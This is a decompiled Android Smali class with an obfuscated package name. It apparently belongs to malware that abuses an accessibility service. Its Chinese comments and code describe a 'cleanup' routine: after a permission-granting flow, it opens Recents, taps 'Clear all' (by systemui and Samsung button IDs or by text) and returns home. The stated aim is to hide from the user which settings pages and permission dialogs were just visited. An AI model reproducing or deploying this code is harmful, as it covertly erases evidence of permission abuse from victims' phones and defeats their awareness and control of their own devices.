.class public final Lڝږ؁ڋ/ڿ;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# 收尾清场：权限流程走完后，打开“最近任务”→ 点“全部清除”→ 回桌面。
# 目的：不把“刚才跳了哪些设置页/权限框”留在最近任务里。

.field private static handler:Landroid/os/Handler;
.field private final svc:Landroid/accessibilityservice/AccessibilityService;
.field private final step:I

.method static constructor <clinit>()V
    .locals 2
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    sput-object v0, Lڝږ؁ڋ/ڿ;->handler:Landroid/os/Handler;
    return-void
.end method

.method public constructor <init>(Landroid/accessibilityservice/AccessibilityService;I)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lڝږ؁ڋ/ڿ;->svc:Landroid/accessibilityservice/AccessibilityService;
    iput p2, p0, Lڝږ؁ڋ/ڿ;->step:I
    return-void
.end method

.method public static start(Landroid/accessibilityservice/AccessibilityService;J)V
    .locals 5
    :try_start_0
    sget-object v0, Lڝږ؁ڋ/ڿ;->handler:Landroid/os/Handler;
    if-nez v0, :cond_0
    return-void
    :cond_0
    new-instance v1, Lڝږ؁ڋ/ڿ;
    const/4 v2, 0x0
    invoke-direct {v1, p0, v2}, Lڝږ؁ڋ/ڿ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V
    invoke-virtual {v0, v1, p1, p2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method public run()V
    .locals 8
    :try_start_0
    iget-object v0, p0, Lڝږ؁ڋ/ڿ;->svc:Landroid/accessibilityservice/AccessibilityService;
    if-nez v0, :cond_0
    return-void
    :cond_0
    iget v1, p0, Lڝږ؁ڋ/ڿ;->step:I
    if-nez v1, :step0
    const/4 v2, 0x1
    if-ne v1, v2, :step1
    const/4 v2, 0x2
    if-ne v1, v2, :step2
    return-void

    :step0
    const/4 v2, 0x3
    invoke-virtual {v0, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    const/4 v1, 0x1
    const-wide/16 v2, 0x4b0
    invoke-static {v0, v1, v2, v3}, Lڝږ؁ڋ/ڿ;->next(Landroid/accessibilityservice/AccessibilityService;IJ)V
    return-void

    :step1
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v5
    if-eqz v5, :cond_next1
    const-string v1, "com.android.systemui:id/clear_all_button"
    invoke-direct {p0, v5, v1}, Lڝږ؁ڋ/ڿ;->clickId(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v1
    if-nez v1, :cond_next1
    const-string v1, "com.sec.android.app.launcher:id/clear_all_button"
    invoke-direct {p0, v5, v1}, Lڝږ؁ڋ/ڿ;->clickId(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v1
    if-nez v1, :cond_next1
    const-string v1, "全部清除"
    invoke-direct {p0, v5, v1}, Lڝږ؁ڋ/ڿ;->clickText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v1
    if-nez v1, :cond_next1
    const-string v1, "Close all"
    invoke-direct {p0, v5, v1}, Lڝږ؁ڋ/ڿ;->clickText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    move-result v1
    if-nez v1, :cond_next1
    const-string v1, "Clear all"
    invoke-direct {p0, v5, v1}, Lڝږ؁ڋ/ڿ;->clickText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    :cond_next1
    const/4 v1, 0x2
    const-wide/16 v2, 0x5dc
    invoke-static {v0, v1, v2, v3}, Lڝږ؁ڋ/ڿ;->next(Landroid/accessibilityservice/AccessibilityService;IJ)V
    return-void

    :step2
    const/4 v2, 0x2
    invoke-virtual {v0, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method private static next(Landroid/accessibilityservice/AccessibilityService;IJ)V
    .locals 3
    :try_start_0
    sget-object v0, Lڝږ؁ڋ/ڿ;->handler:Landroid/os/Handler;
    new-instance v1, Lڝږ؁ڋ/ڿ;
    invoke-direct {v1, p0, p1}, Lڝږ؁ڋ/ڿ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V
    invoke-virtual {v0, v1, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method private clickId(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .locals 4
    const/4 v0, 0x0
    :try_start_0
    invoke-virtual {p1, p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;
    move-result-object v1
    if-eqz v1, :cond_0
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z
    move-result v2
    if-eqz v2, :cond_1
    :cond_0
    return v0
    :cond_1
    const/4 v2, 0x0
    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;
    const/16 v2, 0x10
    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    move-result v1
    return v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    :catch_0
    return v0
.end method

.method private clickText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .locals 4
    const/4 v0, 0x0
    :try_start_0
    invoke-virtual {p1, p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
    move-result-object v1
    if-eqz v1, :cond_0
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z
    move-result v2
    if-eqz v2, :cond_1
    :cond_0
    return v0
    :cond_1
    const/4 v2, 0x0
    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;
    const/16 v2, 0x10
    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    move-result v1
    return v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    :catch_0
    return v0
.end method
